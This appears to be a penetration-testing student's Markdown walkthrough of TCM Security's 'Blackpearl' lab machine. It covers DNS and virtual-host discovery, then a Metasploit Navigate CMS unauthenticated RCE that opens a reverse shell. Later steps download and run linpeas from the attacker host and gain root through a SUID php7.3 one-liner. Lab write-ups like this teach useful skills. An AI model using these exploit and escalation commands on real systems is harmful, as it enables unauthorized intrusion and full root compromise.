
<div align="left"> <img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" /> <img src="https://img.shields.io/badge/Stager-0f172a?style=flat-square" /> <img src="https://img.shields.io/badge/🎯%20Role-Internal_Penetration_Tester-1e293b?style=flat-square" /> <img src="https://img.shields.io/badge/📜%20Certification-PNPT_(TCM_Security)-334155?style=flat-square" /> <img src="https://img.shields.io/badge/🟢%20Status-Completed-16a34a?style=flat-square" /> </div>

# TCM Security — Capstone: Blackpearl

<div align="left">

![Category: Virtual Host Routing + CMS Exploit + SUID PrivEsc](https://img.shields.io/badge/Category-VHost%20Routing%20%2B%20CMS%20RCE%20%2B%20SUID-red)<br> ![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br> ![Platform: TCM Security — PEH Course](https://img.shields.io/badge/Platform-TCM%20Security%20PEH%20Capstone-darkgreen)

</div>

---

## 📌 Overview

Blackpearl is a deliberately vulnerable Linux machine from TCM Security's Practical Ethical Hacking course. Its primary lesson is **Virtual Host Routing** — a technique used extensively in CTF environments and real-world web infrastructure where a single IP serves multiple domains based on the HTTP Host header.

The attack chain requires:

- DNS enumeration to discover a hidden domain name
- Understanding virtual host routing to access a hidden CMS
- Exploiting Navigate CMS unauthenticated RCE
- SUID binary abuse to escalate to root

---

## 🛠 Tools Used

```
nmap            → port and service discovery
gobuster        → web directory enumeration
dnsrecon        → DNS reverse lookup for domain discovery
Metasploit      → Navigate CMS RCE exploit
linpeas.sh      → SUID and privilege escalation enumeration
GTFOBins        → SUID binary exploitation reference
```

---

## 🎯 Target Information

|Field|Value|
|---|---|
|Target IP|172.20.10.4|
|Attacker IP|172.20.10.2|
|Discovered Domain|blackpearl.tcm|
|OS|Linux (Debian)|
|Web Server|nginx 1.14.2|
|Goal|Read /root/flag.txt|

---

## 🧭 Walkthrough

### Step 1 — Service Discovery (Nmap)

**Goal:** Identify open ports and running services.

```bash
nmap -p- -A -T4 172.20.10.4
```

**Key findings:**

|Port|Service|Detail|
|---|---|---|
|22/tcp|SSH|OpenSSH 7.9p1 Debian|
|53/tcp|DNS|ISC BIND 9.11.5|
|80/tcp|HTTP|nginx 1.14.2|

Port 53 (DNS) was the critical finding. A DNS service running on a CTF/lab machine almost always means there is a domain name to discover.

Port 80 returned only the nginx default page — nothing useful at the IP level yet.

![Nmap Scan Results](./images/nmap%20dirbuster.png)

---

### Step 2 — Source Code Inspection

**Goal:** Gather any information left in the page source.

Viewing the source of `http://172.20.10.4` revealed an HTML comment on line 25:

```html
<!-- Webmaster: alek@blackpearl.tcm -->
```

This disclosed the domain name `blackpearl.tcm` and a username `alek`. Both pieces of information were noted for later use.

![Domain Found in Source Code](./images/found%20user%20in%20sourcecode.png)

---

### Step 3 — DNS Enumeration

**Goal:** Confirm the domain name via DNS reverse lookup.

With port 53 open, the machine was running its own DNS server. A reverse lookup was performed against the loopback range to query for PTR records:

```bash
dnsrecon -r 127.0.0.0/24 -n 172.20.10.4 -d black
```

**Why 127.0.0.0/24?** The `-n 172.20.10.4` flag points dnsrecon at the machine's own DNS server. The `-r 127.0.0.0/24` flag asks that server to reverse-resolve every IP in the loopback range. Machines often map their own domain to localhost (127.0.0.1) internally — which is exactly what this box did.

**Result:**

```
[+] PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```

The domain `blackpearl.tcm` was confirmed. The `/etc/hosts` file was updated to map this domain to the target IP:

```bash
sudo nano /etc/hosts
# Added: 172.20.10.4    blackpearl.tcm
```

![DNS to Domain Mapping](./images/checked%20dns%20ip%20to%20domain%20blackpearl.tcm%20in%20hosts.png)

---

### Step 4 — Virtual Host Routing and Web Enumeration

**Goal:** Access the hidden web application using the discovered domain.

**Why the domain matters:** nginx uses Virtual Host Routing — when a request arrives, it checks the HTTP `Host:` header to decide which site to serve. Requests to `http://172.20.10.4` show the default nginx page. Requests to `http://blackpearl.tcm` route to the Navigate CMS. Without updating `/etc/hosts`, the CMS was completely unreachable.

Gobuster was re-run against the domain:

```bash
gobuster dir -u http://blackpearl.tcm/ \
  -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/big.txt \
  -x php,html,txt
```

**Result:** `/navigate` (301) — redirecting to the Navigate CMS.

![Directory Enumeration on Domain](./images/did%20disbuster%20to%20new%20domain%20found%20navigate.png)

---

### Step 5 — Navigate CMS Login Portal

**Goal:** Identify the CMS version and search for known vulnerabilities.

Navigating to `http://blackpearl.tcm/navigate/login.php` presented the Navigate CMS login portal. The version number `2.8` was visible in the bottom right corner.

A search for known exploits revealed: **Navigate CMS 2.8 — Unauthenticated Remote Code Execution**.

![Navigate CMS Login Portal](./images/found%20login.png)

---

### Step 6 — Exploit Navigate CMS (Unauthenticated RCE)

**Goal:** Gain a shell on the target machine.

The Metasploit module `exploit/multi/http/navigate_cms_rce` was used. A critical configuration step was setting the `vhost` option to `blackpearl.tcm` — without this, the exploit would hit the nginx default page and fail.

```bash
msfconsole
use exploit/multi/http/navigate_cms_rce
set RHOSTS 172.20.10.4
set LHOST 172.20.10.2
set LPORT 3333
set vhost blackpearl.tcm
exploit
```

**Output:**

```
[+] Login bypass successful
[+] Upload successful
[+] Triggering payload...
[*] Meterpreter session 1 opened
```

A shell was obtained:

```bash
shell
whoami
# www-data
```

Initial access confirmed as `www-data` — a low-privilege web server account.

![Shell Via Navigate CMS Exploit](./images/got%20a%20shell%20after%20exploit%20navigate%20cms%20and%20bypass%20authenticaion.png)

---

### Step 7 — Privilege Escalation Enumeration (linpeas)

**Goal:** Identify vectors to escalate from www-data to root.

linpeas was hosted on the attacker machine and transferred to the target:

```bash
# On Kali:
python3 -m http.server 80

# On target:
cd /tmp
wget http://172.20.10.2/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

linpeas highlighted a critical finding in red under the SUID section:

```
-rwsr-xr-x 1 root root 4.6M Feb 13 2021 /usr/bin/php7.3  (Unknown SUID binary!)
```

`php7.3` was owned by root and had the SUID bit set. This meant any user could execute it and it would run with root's effective UID.

![Linpeas SUID Findings](./images/runned%20linpeas.png)

---

### Step 8 — SUID Exploitation via php7.3 (Root)

**Goal:** Abuse the php7.3 SUID binary to obtain a root shell.

The SUID binary was confirmed manually:

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/php7.3 confirmed
```

GTFOBins was checked for the PHP SUID entry. The exploit command:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

The `-p` flag preserves the effective UID (euid=0 from the SUID bit), spawning a shell running as root.

**Verification:**

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

cd /root
ls
# flag.txt

cat flag.txt
# Good job on this one.
# Finding the domain name may have been a little guessy,
# but the goal of this box is mainly to teach about Virtual Host Routing
# which is used in a lot of CTF.
```

Root access confirmed.

![Root Escalation via SUID](./images/esclated%20to%20root%20by%20running%20a%20root%20file%20us%20low%20user.png)

---

##  Proof of Compromise

|Flag|Location|Content|
|---|---|---|
|Root flag|`/root/flag.txt`|"Good job on this one..."|

**euid=0(root)** confirmed via `id` command after php7.3 SUID exploitation.

---

##  What This Lab Teaches

- **Port 53 open = DNS to enumerate** — always query the machine's own DNS server when it's running one
- **Virtual Host Routing** — a single IP can serve multiple sites; the domain name is required to access them
- **Page source is part of recon** — the domain name was hidden in an HTML comment
- **Unauthenticated CMS exploits are high-value** — no credentials needed, direct RCE
- **SUID binaries owned by root = privilege escalation** — linpeas surfaces them; GTFOBins tells you how to use them
- **The `vhost` option in Metasploit** — forgetting to set it would have caused the exploit to fail silently

---

##  Attack Chain Summary

```
Nmap → ports 22, 53, 80
    ↓
Source code → alek@blackpearl.tcm (domain hint)
    ↓
dnsrecon on port 53 → PTR record confirms blackpearl.tcm
    ↓
/etc/hosts updated → virtual host routing unlocked
    ↓
Gobuster on domain → /navigate (Navigate CMS 2.8)
    ↓
Metasploit navigate_cms_rce (set vhost!) → www-data shell
    ↓
linpeas → /usr/bin/php7.3 SUID (Unknown binary — root owned)
    ↓
GTFOBins php SUID → pcntl_exec('/bin/sh', ['-p']) → euid=0(root)
    ↓
cat /root/flag.txt
```

---

## 📌 Conclusion

> **Enumeration before exploitation — the domain was the key to everything.**

Without discovering `blackpearl.tcm` through DNS enumeration and source code inspection, the Navigate CMS would have remained completely invisible. This box teaches a fundamental real-world technique: web servers frequently host multiple applications behind a single IP, and the domain name is what unlocks them.

---

This work is part of **FuzzRaiders**' structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability and methodological rigor.

Happy hacking 🚀

---

### Author: Stager

### Role: Internal Penetration Tester — FuzzRaiders